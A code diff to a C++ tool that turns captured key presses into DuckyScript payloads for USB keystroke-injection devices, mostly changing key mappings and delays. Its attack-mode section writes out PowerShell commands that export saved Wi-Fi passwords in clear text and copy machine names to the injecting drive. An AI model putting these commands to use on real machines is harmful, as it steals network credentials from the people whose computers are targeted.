@@ -4,6 +4,7 @@
 #include <string>
 #include <limits>
 #include <vector>
+#include <algorithm>
 
 using std::cout; using std::fstream; using std::string; using std::cin; using std::ios;
 using std::endl; using std::vector;
@@ -12,6 +13,7 @@ using std::endl; using std::vector;
 void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int &attackMode);
 void FormatString(string file, unsigned char key, bool shift, bool ctrl);
 void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, int &isComment);
+void InitialDelay(string file);
 void SpecialKeys(string file, unsigned char key, int &counter);
 bool ChangeAttackMode(string file, unsigned char &key, int &attackMode);
 bool PasteText(string file, unsigned char key, bool ctrl);
@@ -65,6 +67,9 @@ void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int 
     unsigned char key;
     int counter = 0;
     string keydelay = "DELAY 50";
+
+    //initial delay of 3 seconds
+    InitialDelay(file);
 
     while(true)
     {
@@ -160,11 +165,10 @@ void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int 
     }
     return;
 }
-// creates a STRINGLN command in ducky language
 // begins/ends when ALT + 1 is pressed
 void FormatString(string file, unsigned char key, bool shift, bool ctrl){
     //declare variables
-    string stringdelay = "DELAY 600";
+    string stringdelay = "DELAY 1200";
 
     //open file
     fstream fout;
@@ -178,41 +182,83 @@ void FormatString(string file, unsigned char key, bool shift, bool ctrl){
     {
         return;
     }
-    switch(key) 
+    if(!shift)
     {
-        //windows control keys
-        case VK_BACK: fout << "\b"; cout << "\b"; break;
-        case VK_TAB: fout << "\t"; cout << "\t"; break;
-        case VK_RETURN: fout << "\n" << stringdelay << endl << "STRINGLN ";
-                        cout << "\n" << stringdelay << endl << "STRINGLN "; break;
-        //special characters
-        case 0xBC: fout << ","; cout << ","; break;
-        case VK_OEM_PERIOD: fout << "."; cout << "."; break;
-        case VK_OEM_1: fout << ";"; cout << ";"; break;
-        case VK_OEM_2: fout << "/"; cout << ";"; break;                        
-        case VK_OEM_3: fout << "`"; cout << "`"; break; //top left corner of keyboard
-        case VK_OEM_4: fout << "["; cout << "["; break;
-        case VK_OEM_6: fout << "]"; cout << "]"; break;
-        case VK_OEM_5: fout << "\\"; cout << "\\"; break;
-        case VK_OEM_7: fout << "'"; cout << "'"; break;
-        case VK_SPACE: fout << " "; cout << " "; break;
-        
-        //F 1-12 keys and numpad keys`
-        case VK_NUMPAD0: fout << "0"; cout << "0"; break;
-        case VK_NUMPAD1: fout << "1"; cout << "1"; break;
-        case VK_NUMPAD2: fout << "2"; cout << "2"; break;
-        case VK_NUMPAD3: fout << "3"; cout << "3"; break;
-        case VK_NUMPAD4: fout << "4"; cout << "4"; break;
-        case VK_NUMPAD5: fout << "5"; cout << "5"; break;
-        case VK_NUMPAD6: fout << "6"; cout << "6"; break;
-        case VK_NUMPAD7: fout << "7"; cout << "7"; break;
-        case VK_NUMPAD8: fout << "8"; cout << "8"; break;
-        case VK_NUMPAD9: fout << "9"; cout << "9"; break;
-        case VK_MULTIPLY: fout << "*"; cout << "*"; break;
-        case VK_ADD: fout << "+"; cout << "+"; break;
-        case VK_SUBTRACT: fout << "-"; cout << "-"; break;
-        case VK_DECIMAL: fout << "."; cout << "."; break;
-        case VK_DIVIDE: fout << "/"; cout << "/"; break;     
+        switch(key) 
+        {
+            //windows control keys
+            case VK_BACK: fout << "\b"; cout << "\b"; break;
+            case VK_TAB: fout << "\t"; cout << "\t"; break;
+            case VK_RETURN: fout << endl << stringdelay << endl << "ENTER" << endl << "STRING ";
+                            cout << endl << stringdelay << endl << "ENTER" << endl  << "STRING "; break;
+            //special characters
+            case 0xBC: fout << ","; cout << ","; break;
+            case VK_OEM_PERIOD: fout << "."; cout << "."; break;
+            case VK_OEM_1: fout << ";"; cout << ";"; break;
+            case VK_OEM_2: fout << "/"; cout << ";"; break;                        
+            case VK_OEM_3: fout << "`"; cout << "`"; break; //top left corner of keyboard
+            case VK_OEM_4: fout << "["; cout << "["; break;
+            case VK_OEM_6: fout << "]"; cout << "]"; break;
+            case VK_OEM_5: fout << "\\"; cout << "\\"; break;
+            case VK_OEM_7: fout << "'"; cout << "'"; break;
+            case VK_SPACE: fout << " "; cout << " "; break;
+            
+            //F 1-12 keys and numpad keys`
+            case VK_NUMPAD0: fout << "0"; cout << "0"; break;
+            case VK_NUMPAD1: fout << "1"; cout << "1"; break;
+            case VK_NUMPAD2: fout << "2"; cout << "2"; break;
+            case VK_NUMPAD3: fout << "3"; cout << "3"; break;
+            case VK_NUMPAD4: fout << "4"; cout << "4"; break;
+            case VK_NUMPAD5: fout << "5"; cout << "5"; break;
+            case VK_NUMPAD6: fout << "6"; cout << "6"; break;
+            case VK_NUMPAD7: fout << "7"; cout << "7"; break;
+            case VK_NUMPAD8: fout << "8"; cout << "8"; break;
+            case VK_NUMPAD9: fout << "9"; cout << "9"; break;
+            case VK_MULTIPLY: fout << "*"; cout << "*"; break;
+            case VK_ADD: fout << "+"; cout << "+"; break;
+            case VK_SUBTRACT: fout << "-"; cout << "-"; break;
+            case VK_DECIMAL: fout << "."; cout << "."; break;
+            case VK_DIVIDE: fout << "/"; cout << "/"; break;     
+        }
+    }
+    else
+    {
+        switch(key) 
+        {
+            //windows control keys
+            case VK_BACK: fout << "\b"; cout << "\b"; break;
+            case VK_TAB: fout << "\t"; cout << "\t"; break;
+            case VK_RETURN: fout << "\n" << stringdelay << endl << "STRING ";
+                            cout << "\n" << stringdelay << endl << "STRING "; break;
+            //special characters
+            case 0xBC: fout << "<"; cout << "<"; break;
+            case VK_OEM_PERIOD: fout << ">"; cout << ">"; break;
+            case VK_OEM_1: fout << ":"; cout << ":"; break;
+            case VK_OEM_2: fout << "?"; cout << "?"; break;                        
+            case VK_OEM_3: fout << "~"; cout << "~"; break; //top left corner of keyboard
+            case VK_OEM_4: fout << "{"; cout << "{"; break;
+            case VK_OEM_6: fout << "}"; cout << "}"; break;
+            case VK_OEM_5: fout << "|"; cout << "|"; break;
+            case VK_OEM_7: fout << "\""; cout << "\""; break;
+            case VK_SPACE: fout << " "; cout << " "; break;
+            
+            //F 1-12 keys and numpad keys`
+            case VK_NUMPAD0: fout << ")"; cout << ")"; break;
+            case VK_NUMPAD1: fout << "!"; cout << "!"; break;
+            case VK_NUMPAD2: fout << "@"; cout << "@"; break;
+            case VK_NUMPAD3: fout << "#"; cout << "#"; break;
+            case VK_NUMPAD4: fout << "$"; cout << "$"; break;
+            case VK_NUMPAD5: fout << "%"; cout << "%"; break;
+            case VK_NUMPAD6: fout << "^"; cout << "^"; break;
+            case VK_NUMPAD7: fout << "&"; cout << "&"; break;
+            case VK_NUMPAD8: fout << "*"; cout << "*"; break;
+            case VK_NUMPAD9: fout << "("; cout << "("; break;
+            case VK_MULTIPLY: fout << "*"; cout << "*"; break;
+            case VK_ADD: fout << "+"; cout << "+"; break;
+            case VK_SUBTRACT: fout << "-"; cout << "-"; break;
+            case VK_DECIMAL: fout << "."; cout << "."; break;
+            case VK_DIVIDE: fout << "/"; cout << "/"; break;     
+        }
     }
     if(key >= 0x30 && key <= 0x39)
     {
@@ -233,7 +279,6 @@ void FormatString(string file, unsigned char key, bool shift, bool ctrl){
     fout.close();
     return;
 }
-
 // change between HID, STRING, and comments
 void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, int &isComment){
     fstream fout;
@@ -242,6 +287,8 @@ void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, 
         cout << endl << "Error opening file" << endl;
         return;
     }
+
+    string stringdelay = "DELAY 1200";
 
     if(key == 0x70) //if F1 is pressed a string command starts/ends
     {
@@ -255,8 +302,8 @@ void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, 
                 // in stringln statement
             }
             bisString = true;
-            cout << "STRINGLN ";
-            fout << "STRINGLN ";
+            cout << stringdelay << endl << "STRING ";
+            fout << stringdelay << endl << "STRING ";
         }
         else {
             //ends a string command in ducky language
@@ -285,6 +332,20 @@ void ChangeMode(string file, unsigned char key, bool &bisString, int &isString, 
     }
     fout.close();
     return;
+}
+// adds initial delay of 3 seconds
+void InitialDelay(string file){
+    fstream fout;
+    fout.open(file.c_str(), ios::app);
+    if(!fout){
+        cout << "Error opening file";
+        return;
+    }
+
+    fout << "DELAY 3000" << endl;
+    cout << "DELAY 3000" << endl;
+    fout.close();
+    return; 
 }
 // checks all special characters (comma, semicolon, slashes)
 void SpecialKeys(string file, unsigned char key, int &counter){
@@ -425,9 +486,9 @@ bool ChangeAttackMode(string file, unsigned char &key, int &attackMode){
                     "REM #1) cd $d; netsh wlan export profile key=clear;" << endl << endl
                  << "REM #2) $env:computername >> $m:\\computer_names.txt" << endl << endl;
             getline(cin, input);
-            cout << endl << "STRINGLN powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
+            cout << endl << "STRING powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
                  << input << "\"" << endl << endl;
-            fout << endl << "STRINGLN powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
+            fout << endl << "STRING powershell \"$m-(Get-Volume -FileSystemLabel \'DUCKY\').DriveLetter+\':\'; " 
                  << input << "\"" << endl << endl;
             attackMode++;
                  return false;
@@ -506,7 +567,7 @@ void CleanPayload(string file){
     fin.close();
 
     //replace file with contents vector (old file minus last line)
-    fout.open(file.c_str());
+    fout.open(file.c_str(), ios::out | ios::trunc);
     if(!fout){
         cout << "Error opening file" << endl;
         return;
